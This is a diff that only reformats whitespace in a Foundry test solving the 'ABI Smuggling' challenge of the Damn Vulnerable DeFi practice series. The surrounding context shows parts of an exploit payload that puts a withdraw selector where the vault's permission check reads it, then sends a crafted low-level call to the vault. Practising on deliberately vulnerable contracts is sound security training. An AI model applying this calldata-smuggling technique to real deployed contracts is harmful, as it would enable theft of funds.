@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,7 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-// Step 1: Create the execute() function selector (0x1cff79cd)
+        // Step 1: Create the execute() function selector (0x1cff79cd)
         bytes4 executeSelector = bytes4(keccak256("execute(address,bytes)"));
 
         // Step 2: Target address (the vault itself)
@@ -87,7 +87,7 @@ contract ABISmugglingChallenge is Test {
 
         // Step 5: The withdraw selector that will be checked (0xd9caed12)
         bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
-        
+
         // Step 6: Length of actual actionData (0x44 = 68 bytes = 4 + 32 + 32)
         bytes memory bytesLength = abi.encode(0x44);
 
@@ -113,7 +113,6 @@ contract ABISmugglingChallenge is Test {
         // Step 10: Execute the call
         (bool success,) = address(vault).call(payload);
         require(success, "Attack failed");
-   
     }
 
     /**
